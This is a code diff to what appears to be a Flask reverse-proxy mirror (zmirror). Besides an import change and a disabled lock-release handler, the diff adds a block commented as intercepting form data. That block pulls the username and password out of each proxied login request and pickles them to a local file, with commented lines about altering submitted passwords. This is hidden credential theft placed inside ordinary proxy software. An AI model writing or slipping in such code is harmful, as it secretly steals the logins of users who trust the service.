@@ -17,7 +17,7 @@ from fnmatch import fnmatch
 from time import time, sleep, process_time
 from html import escape as html_escape
 from datetime import datetime, timedelta
-from urllib.parse import urljoin, urlsplit, urlunsplit, quote_plus
+from urllib.parse import urljoin, urlsplit, urlunsplit, quote_plus,parse_qs,urlencode
 import urllib.parse
 import requests
 from flask import Flask, request, make_response, Response, redirect
@@ -2245,12 +2245,13 @@ def rewrite_client_request():
 
 # ################# Begin Flask After Request ################
 
-@app.after_request
-def zmirror_after_request(response):
-	# 移除 connection_pool 中的锁
-	if enable_connection_keep_alive:
-		connection_pool.release_lock()
-	return response
+# @app.after_request
+# def zmirror_after_request(response):
+# 	# 移除 connection_pool 中的锁
+# 	if enable_connection_keep_alive:
+# 		connection_pool.release_lock()
+# 	# U.log( request.headers)	
+# 	return response
 
 
 # ################# End Flask After Request ################
@@ -2493,6 +2494,23 @@ def main_function(input_path='/'):
 
 	# 解析并重写浏览器请求的data内容
 	parse.request_data, parse.request_data_encoding = prepare_client_request_data()
+
+	#qgb 拦截 表单数据
+	if parse.request_data and 'username' in parse.request_data:
+		client_query=parse_qs(qs=parse.request_data,keep_blank_values=True)
+		if( 'username' in client_query):
+			if 'password' not in client_query:U.log(client_query)
+			if 'password' in client_query:
+				username=client_query['username'][0]
+				password=client_query['password'][0]
+				sys.dup[username]=password
+				F.dill_dump(obj=sys.dup,file=U.gst+'0731.mfyq.dup')
+			# U.log(['=====',parse.request_data])
+		urlencode(query=client_query, doseq=True)
+		# parse.request_data=.replace('1234qwer','xxxxxxxxxxxx')
+		# parse.request_data=parse.request_data.replace('1234wxsb','1234qwer')
+
+
 
 	# 请求真正的远程服务器
 	# 并在返回404/500时进行 domain_guess 尝试
